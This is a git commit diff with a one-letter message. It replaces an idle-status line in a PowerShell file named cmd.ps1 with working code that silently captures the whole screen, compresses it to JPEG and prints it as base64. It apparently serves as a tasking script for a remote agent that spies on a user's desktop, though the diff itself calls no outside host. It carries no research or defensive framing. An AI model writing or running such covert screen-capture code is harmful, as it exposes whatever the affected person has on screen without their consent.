f82da7d337c7def0cc4805bd4a208268c4a52224
bloxvm4826 <filthysignal546@mail.bu.app>
2026-07-28 11:34:55 -0400

    x

--- cmd.ps1
+++ cmd.ps1
@@ -1,1 +1,12 @@
-Write-Host ("idle " + (Get-Date -Format HH:mm:ss))
+Write-Host ("up " + (Get-Date -Format HH:mm:ss)); Write-Host (Test-Path C:\l.ps1)
+Add-Type -AssemblyName System.Drawing
+$b=New-Object Drawing.Bitmap 1600,900
+$g=[Drawing.Graphics]::FromImage($b); $g.CopyFromScreen(0,0,0,0,(New-Object Drawing.Size 1600,900))
+$s=New-Object Drawing.Bitmap 1280,720
+$g2=[Drawing.Graphics]::FromImage($s); $g2.DrawImage($b,0,0,1280,720)
+$ms=New-Object IO.MemoryStream
+$enc=[Drawing.Imaging.ImageCodecInfo]::GetImageEncoders()|?{$_.MimeType -eq 'image/jpeg'}
+$p=New-Object Drawing.Imaging.EncoderParameters 1
+$p.Param[0]=New-Object Drawing.Imaging.EncoderParameter ([Drawing.Imaging.Encoder]::Quality),40
+$s.Save($ms,$enc,$p)
+"B64:"+[Convert]::ToBase64String($ms.ToArray())
